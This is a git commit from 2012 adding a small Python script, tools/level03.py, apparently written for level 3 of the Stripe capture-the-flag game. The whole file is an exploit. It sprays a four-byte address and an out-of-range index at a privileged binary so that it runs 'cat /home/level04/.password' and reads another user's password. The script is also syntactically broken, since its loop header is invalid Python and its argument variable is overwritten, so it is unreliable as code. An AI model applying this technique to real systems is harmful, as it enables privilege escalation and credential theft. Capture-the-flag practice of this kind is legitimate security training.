c78c4c2c2e222d08ffaf49ba7effc2869618f4fe
Fabian Faessler <fabi@fabif.de>
2012-03-01 21:47:57 +0100

    stripe ctf game

---
+++ tools/level03.py
@@ -0,0 +1,11 @@
+
+import os,sys
+i = sys.argv[1]
+for i in xrange:(-2147483555,-2147483755):
+        adr = str(chr(8))+str(chr(4))+str(chr(135))+str(chr(91))
+        cmd = "/levels/level03 "+str(i)+" \"cat /home/level04/.password; "
+        for n in xrange(0,10000):
+                cmd += adr
+        cmd += "\""
+        for n in xrange(0,50):
+                os.system(cmd)
